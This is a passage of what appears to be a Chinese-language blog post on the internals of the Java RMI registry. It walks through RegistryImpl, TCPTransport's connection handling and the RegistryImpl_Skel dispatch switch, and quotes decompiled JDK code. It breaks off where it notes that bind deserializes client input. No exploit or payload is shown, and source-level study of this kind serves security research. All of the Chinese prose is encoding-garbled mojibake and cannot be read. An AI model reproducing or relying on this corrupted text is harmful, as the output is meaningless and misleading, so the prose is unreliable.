å…¥ä¸¤ä¸ªSocketå¯¹è±¡ã€‚</p><p>å…¶å®è¿™ä¸¤ç§æ–¹æ³•æœ€ç»ˆè·å–åˆ°çš„éƒ½æ˜¯RegistryImplå¯¹è±¡ï¼Œæ‰€ä»¥å¯¹äºæˆ‘ä»¬æ¥è¯´ç”¨å“ªç§æ„ä¹‰ä¸å¤§ï¼Œæˆ‘ä»¬åªéœ€è¦åˆ†æç¬¬ä¸€ç§å³å¯ã€‚</p><p>é€šè¿‡ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœåªä¼ å…¥portçš„è¯ï¼Œä»–ä¼šnewä¸€ä¸ªRegistryImpl()å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¿›çœ‹ä¸€ä¸‹å…·ä½“çš„å®ç°æ­¥éª¤ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/22/cf4b52a033f2c39553a24d30c7e89f7d.png" alt="image-20230822152426268"></p><p>å¯ä»¥çœ‹åˆ°å†…éƒ¨æ—¶åšäº†åˆ¤æ–­ï¼Œé¦–å…ˆè¦æ±‚ç«¯å£ç­‰äº1099ä¸”è®¾ç½®äº†å®‰å…¨ç®¡ç†å™¨ä¼šè¿›å…¥ifã€‚å¦åˆ™ä¼šæ‰§è¡Œelseä¸­çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä¸ç®¡æ˜¯ifè¿˜æ˜¯elseä»–ä»¬ä¸­éƒ½æœ‰æˆ‘ä»¬ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æåˆ°çš„<code>LiveRef</code>ï¼Œæˆ‘ä»¬çŸ¥é“<code>LiveRef</code>æ˜¯ç»è¿‡å°è£…çš„å¤„ç†ç½‘ç»œè¯·æ±‚çš„ç±»ã€‚</p><p>å†å¾€åå°±æ˜¯åˆ›å»ºstubå’ŒSkeletonäº†ï¼Œæˆ‘ä»¬çœå»è¿™æ­¥ï¼Œä¹‹åå°±åˆ°äº†<code>TCPTransport.Object</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/acfe9a0a16740e3c29e158d17db5bde5.png" alt="image-20230822154504105"></p><p>è·Ÿè¿›listen()æ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/74e8ce5c4cfa5131f6e02b18b59b853c.png" alt="image-20230822155148288"></p><p>åœ¨newServerSocketæ—¶ä¼šå¼€å¯ç«¯å£ç›‘å¬ï¼Œæ¥ç€ä¼šè®¾ç½®AcceptLoopçº¿ç¨‹ï¼Œæ­¤æ—¶ä¼šè§¦å‘runæ–¹æ³•ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/22/a2e20a9d46e7d0f517503841b067113e.png" alt="image-20230822155032317"></p><p>åœ¨è·Ÿè¿›<code>executeAcceptLoop()</code>:</p><p>ä»–ä¼šè·å–åˆ°è¯·æ±‚çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚Hostä¹‹ç±»çš„ï¼›ä¹‹ååœ¨ä¸‹è¾¹ä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹è°ƒç”¨<code>ConnectionHandler</code>æ¥å¤„ç†è¯·æ±‚ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/a1d3ca5eff9e5e7ec2661fdf83e1ce7b.png" alt="image-20230822155513463"></p><p>è·Ÿè¿›<code>ConnectionHandler</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/40df2c94f5fca5d56fe89e40ce9661da.png" alt="image-20230822160103475"></p><p>è¿™é‡Œçš„var2å°±æ˜¯ä¸Šé¢ä¼ å…¥çš„ServerSocketå¯¹è±¡ï¼Œå†è·Ÿè¿›<code>run0()</code>ï¼š</p><p>è¿™ä¸ª<code>run0</code>ä»£ç æœ‰ç‚¹å¤šæˆ‘å°±ä¸æˆªå›¾äº†ï¼Œç›´æ¥è´´ä¸Šï¼Œæ–¹ä¾¿å¤§å®¶é˜…è¯»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run0</span><span class="hljs-params">()</span> &#123;<br>           <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> TCPTransport.<span class="hljs-built_in">this</span>.getEndpoint();<br>           <span class="hljs-type">int</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> var1.getPort();<br>           TCPTransport.threadConnectionHandler.set(<span class="hljs-built_in">this</span>);<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-built_in">this</span>.socket.setTcpNoDelay(<span class="hljs-literal">true</span>);<br>           &#125; <span class="hljs-keyword">catch</span> (Exception var31) &#123;<br>           &#125;<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-keyword">if</span> (TCPTransport.connectionReadTimeout &gt; <span class="hljs-number">0</span>) &#123;<br>                   <span class="hljs-built_in">this</span>.socket.setSoTimeout(TCPTransport.connectionReadTimeout);<br>               &#125;<br>           &#125; <span class="hljs-keyword">catch</span> (Exception var30) &#123;<br>           &#125;<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-type">InputStream</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.socket.getInputStream();<br>               <span class="hljs-type">Object</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var3.markSupported() ? var3 : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(var3);<br>               ((InputStream)var4).mark(<span class="hljs-number">4</span>);<br>               <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>((InputStream)var4);<br>               <span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var5.readInt();<br>               <span class="hljs-keyword">if</span> (var6 == <span class="hljs-number">1347375956</span>) &#123;<br>                   <span class="hljs-keyword">if</span> (TCPTransport.disableIncomingHttp) &#123;<br>                       <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteException</span>(<span class="hljs-string">&quot;RMI over HTTP is disabled&quot;</span>);<br>                   &#125;<br><br>                   TCPTransport.tcpLog.log(Log.BRIEF, <span class="hljs-string">&quot;decoding HTTP-wrapped call&quot;</span>);<br>                   ((InputStream)var4).reset();<br><br>                   <span class="hljs-keyword">try</span> &#123;<br>                       <span class="hljs-built_in">this</span>.socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpReceiveSocket</span>(<span class="hljs-built_in">this</span>.socket, (InputStream)var4, (OutputStream)<span class="hljs-literal">null</span>);<br>                       <span class="hljs-built_in">this</span>.remoteHost = <span class="hljs-string">&quot;0.0.0.0&quot;</span>;<br>                       var3 = <span class="hljs-built_in">this</span>.socket.getInputStream();<br>                       var4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(var3);<br>                       var5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>((InputStream)var4);<br>                       var6 = var5.readInt();<br>                   &#125; <span class="hljs-keyword">catch</span> (IOException var29) &#123;<br>                       <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteException</span>(<span class="hljs-string">&quot;Error HTTP-unwrapping call&quot;</span>, var29);<br>                   &#125;<br>               &#125;<br><br>               <span class="hljs-type">short</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var5.readShort();<br>               <span class="hljs-keyword">if</span> (var6 == <span class="hljs-number">1246907721</span> &amp;&amp; var7 == <span class="hljs-number">2</span>) &#123;<br>                   <span class="hljs-type">OutputStream</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.socket.getOutputStream();<br>                   <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(var8);<br>                   <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(var9);<br>                   <span class="hljs-type">int</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.socket.getPort();<br>                   <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;<br>                       TCPTransport.tcpLog.log(Log.BRIEF, <span class="hljs-string">&quot;accepted socket from [&quot;</span> + <span class="hljs-built_in">this</span>.remoteHost + <span class="hljs-string">&quot;:&quot;</span> + var11 + <span class="hljs-string">&quot;]&quot;</span>);<br>                   &#125;<br><br>                   <span class="hljs-type">byte</span> <span class="hljs-variable">var15</span> <span class="hljs-operator">=</span> var5.readByte();<br>                   TCPEndpoint var12;<br>                   TCPChannel var13;<br>                   TCPConnection var14;<br>                   <span class="hljs-keyword">switch</span> (var15) &#123;<br>                       <span class="hljs-keyword">case</span> <span class="hljs-number">75</span>:<br>                           var10.writeByte(<span class="hljs-number">78</span>);<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) suggesting &quot;</span> + <span class="hljs-built_in">this</span>.remoteHost + <span class="hljs-string">&quot;:&quot;</span> + var11);<br>                           &#125;<br><br>                           var10.writeUTF(<span class="hljs-built_in">this</span>.remoteHost);<br>                           var10.writeInt(var11);<br>                           var10.flush();<br>                           <span class="hljs-type">String</span> <span class="hljs-variable">var16</span> <span class="hljs-operator">=</span> var5.readUTF();<br>                           <span class="hljs-type">int</span> <span class="hljs-variable">var17</span> <span class="hljs-operator">=</span> var5.readInt();<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) client using &quot;</span> + var16 + <span class="hljs-string">&quot;:&quot;</span> + var17);<br>                           &#125;<br><br>                           var12 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(<span class="hljs-built_in">this</span>.remoteHost, <span class="hljs-built_in">this</span>.socket.getLocalPort(), var1.getClientSocketFactory(), var1.getServerSocketFactory());<br>                           var13 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPChannel</span>(TCPTransport.<span class="hljs-built_in">this</span>, var12);<br>                           var14 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPConnection</span>(var13, <span class="hljs-built_in">this</span>.socket, (InputStream)var4, var9);<br>                           TCPTransport.<span class="hljs-built_in">this</span>.handleMessages(var14, <span class="hljs-literal">true</span>);<br>                           <span class="hljs-keyword">return</span>;<br>                       <span class="hljs-keyword">case</span> <span class="hljs-number">76</span>:<br>                           var12 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(<span class="hljs-built_in">this</span>.remoteHost, <span class="hljs-built_in">this</span>.socket.getLocalPort(), var1.getClientSocketFactory(), var1.getServerSocketFactory());<br>                           var13 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPChannel</span>(TCPTransport.<span class="hljs-built_in">this</span>, var12);<br>                           var14 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPConnection</span>(var13, <span class="hljs-built_in">this</span>.socket, (InputStream)var4, var9);<br>                           TCPTransport.<span class="hljs-built_in">this</span>.handleMessages(var14, <span class="hljs-literal">false</span>);<br>                           <span class="hljs-keyword">return</span>;<br>                       <span class="hljs-keyword">case</span> <span class="hljs-number">77</span>:<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) accepting multiplex protocol&quot;</span>);<br>                           &#125;<br><br>                           var10.writeByte(<span class="hljs-number">78</span>);<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) suggesting &quot;</span> + <span class="hljs-built_in">this</span>.remoteHost + <span class="hljs-string">&quot;:&quot;</span> + var11);<br>                           &#125;<br><br>                           var10.writeUTF(<span class="hljs-built_in">this</span>.remoteHost);<br>                           var10.writeInt(var11);<br>                           var10.flush();<br>                           var12 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(var5.readUTF(), var5.readInt(), var1.getClientSocketFactory(), var1.getServerSocketFactory());<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) client using &quot;</span> + var12.getHost() + <span class="hljs-string">&quot;:&quot;</span> + var12.getPort());<br>                           &#125;<br><br>                           ConnectionMultiplexer var18;<br>                           <span class="hljs-keyword">synchronized</span>(TCPTransport.<span class="hljs-built_in">this</span>.channelTable) &#123;<br>                               var13 = TCPTransport.<span class="hljs-built_in">this</span>.getChannel(var12);<br>                               var18 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionMultiplexer</span>(var13, (InputStream)var4, var8, <span class="hljs-literal">false</span>);<br>                               var13.useMultiplexer(var18);<br>                           &#125;<br><br>                           var18.run();<br>                           <span class="hljs-keyword">return</span>;<br>                       <span class="hljs-keyword">default</span>:<br>                           var10.writeByte(<span class="hljs-number">79</span>);<br>                           var10.flush();<br>                           <span class="hljs-keyword">return</span>;<br>                   &#125;<br>               &#125;<br><br>               TCPTransport.closeSocket(<span class="hljs-built_in">this</span>.socket);<br>           &#125; <span class="hljs-keyword">catch</span> (IOException var32) &#123;<br>               TCPTransport.tcpLog.log(Log.BRIEF, <span class="hljs-string">&quot;terminated with exception:&quot;</span>, var32);<br>               <span class="hljs-keyword">return</span>;<br>           &#125; <span class="hljs-keyword">finally</span> &#123;<br>               TCPTransport.closeSocket(<span class="hljs-built_in">this</span>.socket);<br>           &#125;<br><br>       &#125;<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼Œå…ˆæ˜¯TCPä¼ è¾“è¿æ¥å¤„ç†æ–¹æ³•ï¼Œç„¶åæ ¹æ®ä¸åŒçš„è°ƒç”¨ç±»å‹è¿›è¡Œç›¸åº”å¤„ç†ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨<code>handleMessages</code>æ¥å¤„ç†è¯·æ±‚ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/e59771e38ad7f3c84349c59f0efb70d4.png" alt="image-20230822161209922"></p><p>ä¸Šé¢è¿˜æ˜¯è·å–å®¢æˆ·ç«¯ä¼ æ¥çš„æ•°æ®ï¼Œæˆ‘ä»¬ä¸»è¦çœ‹ä¸‹é¢çš„éƒ¨åˆ†ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/24f33ca283f4a04f8dc199b3a8f09598.png" alt="image-20230822161256820"></p><p>è¿™é‡Œåªéœ€è¦å…³æ³¨80ï¼Œå› ä¸ºå®¢æˆ·ç«¯å‘é€æ•°æ®çš„æ—¶å€™è¿™é‡Œå‘çš„æ˜¯80ï¼Œå…·ä½“åè¾¹ä¼šè¯´ã€‚</p><p>åœ¨80éƒ¨åˆ†ï¼Œå…ˆåˆ›å»ºäº†<code>StreamRemoteCall()</code>å¯¹è±¡ï¼Œå¹¶ä¼ å…¥var1ï¼Œvar1æ˜¯å½“å‰è¿æ¥çš„Connectionå¯¹è±¡ã€‚å†è·Ÿè¿›<code>serviceCall()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/e47f9c3228385f27fce79ae0074d3314.png" alt="image-20230822161710312"></p><p>ä¸Šé¢è¿˜æ˜¯å…ˆè·å–ä¿¡æ¯(ObjIDã€Targetå¯¹è±¡â€¦..)ï¼Œå†ä¸‹é¢ä¼šè°ƒç”¨<code>dispath()</code>æ¥å¤„ç†è¯·æ±‚ï¼Œä»–æœ¬èº«å‡ é¦–ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯<code>Remote</code>å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯å½“å‰è¿æ¥çš„<code>StreamRemoteCall</code>å¯¹è±¡ï¼Œæ¥ç€è·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/662717d17f9886a6502a89856e819ba6.md.png" alt="image-20230822162739226"></p><p>å‰é¢è¿˜æ˜¯æ¥æ”¶æ•°æ®ï¼Œæ¥ç€ä¼šè°ƒ<code>oldDispatch()</code>:</p><p><img src="https://ice.frostsky.com/2023/08/22/275901a46a4cb7c12f85137e55ea6793.png" alt="image-20230822162922253"></p><p>æœ€åè°ƒç”¨äº†<code>this.skel.dispatch()</code>,æ­¤æ—¶çš„<code>this.skel</code>ä¸ºåˆšåˆšåˆ›å»ºçš„<code>RegistryImpl_Skel</code>å¯¹è±¡ï¼Œæ¥ç€è·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/1940958287a24a2e3ac4012d570b37a2.png" alt="image-20230822163235287"></p><p><img src="https://ice.frostsky.com/2023/08/22/8fa89c502acee602776f65be69d4a756.png" alt="image-20230822163348059"></p><p>è¿™é‡Œå°±æ˜¯çœŸæ­£å¤„ç†è¯·æ±‚çš„æ ¸å¿ƒäº†ï¼Œ<code>var3</code>æ˜¯ä¼ é€’è¿‡æ¥çš„intç±»å‹çš„å‚æ•°ï¼Œåœ¨è¿™é‡Œæœ‰å¦‚ä¸‹å¯¹åº”å…³ç³»(é™„ä»£ç )ï¼š</p><ul><li><strong>0â€”&gt;bind</strong></li><li><strong>1â€”&gt;list</strong></li><li><strong>2â€”&gt;lookup</strong></li><li><strong>3â€”&gt;rebind</strong></li><li><strong>4â€”&gt;unbind</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">switch</span> (var3) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.bind&quot;</span>);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var9 = var2.getInputStream();<br>                        var7 = (String)var9.readObject();<br>                        var80 = (Remote)var9.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var77) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var77);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.bind(var7, var80);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var76) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var76);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    var2.releaseInputStream();<br>                    String[] var79 = var6.list();<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var81</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        var81.writeObject(var79);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var75) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var75);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var8 = var2.getInputStream();<br>                        var7 = (String)var8.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var73) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var73);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var80 = var6.lookup(var7);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var82</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        var82.writeObject(var80);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var72) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var72);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.rebind&quot;</span>);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var9 = var2.getInputStream();<br>                        var7 = (String)var9.readObject();<br>                        var80 = (Remote)var9.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var70) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var70);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.rebind(var7, var80);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var69) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var69);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.unbind&quot;</span>);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var8 = var2.getInputStream();<br>                        var7 = (String)var8.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var67) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var67);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.unbind(var7);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var66) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var66);<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>            &#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä¼šå¯¹æ¯ä¸ªè°ƒç”¨çš„æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚ä½ è°ƒç”¨äº†bindæ–¹æ³•ï¼Œå°±ä¼šå…ˆreadObjectååºåˆ—åŒ–ä½ 